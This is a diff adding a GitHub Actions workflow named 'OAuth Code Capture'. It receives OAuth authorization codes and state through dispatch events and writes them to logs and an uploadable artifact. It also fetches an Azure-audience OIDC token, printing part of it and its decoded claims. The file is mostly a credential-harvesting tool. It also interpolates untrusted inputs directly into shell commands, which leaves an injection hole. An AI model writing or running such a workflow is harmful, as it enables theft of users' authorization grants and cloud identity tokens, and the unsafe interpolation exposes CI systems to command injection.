@@ -1,0 +1,60 @@
+name: OAuth Code Capture
+on:
+  repository_dispatch:
+    types: [oauth-capture]
+  workflow_dispatch:
+    inputs:
+      code:
+        description: 'OAuth authorization code'
+        required: false
+      state:
+        description: 'OAuth state'
+        required: false
+
+permissions:
+  id-token: write
+  contents: read
+  issues: write
+
+jobs:
+  capture:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Log captured OAuth code
+        env:
+          OAUTH_CODE: ${{ github.event.client_payload.code || inputs.code }}
+          OAUTH_STATE: ${{ github.event.client_payload.state || inputs.state }}
+        run: |
+          echo "=== OAUTH CODE CAPTURED ==="
+          echo "Code: $OAUTH_CODE"
+          echo "State: $OAUTH_STATE"
+          echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          echo "Runner IP: $(curl -s https://api.ipify.org)"
+          echo "=========================="
+
+      - name: Get GitHub Actions OIDC Token
+        id: get-oidc
+        run: |
+          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
+          echo "OIDC token acquired (first 50 chars): ${OIDC_TOKEN:0:50}"
+          # Decode claims
+          PAYLOAD=$(echo $OIDC_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null || echo "decode failed")
+          echo "OIDC claims: $PAYLOAD"
+
+      - name: Create capture artifact
+        run: |
+          mkdir -p artifacts
+          echo "{
+            \"code\": \"${{ github.event.client_payload.code || inputs.code }}\",
+            \"state\": \"${{ github.event.client_payload.state || inputs.state }}\",
+            \"captured_at\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
+            \"run_url\": \"${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\"
+          }" > artifacts/captured_code.json
+          cat artifacts/captured_code.json
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: oauth-capture-${{ github.run_number }}
+          path: artifacts/
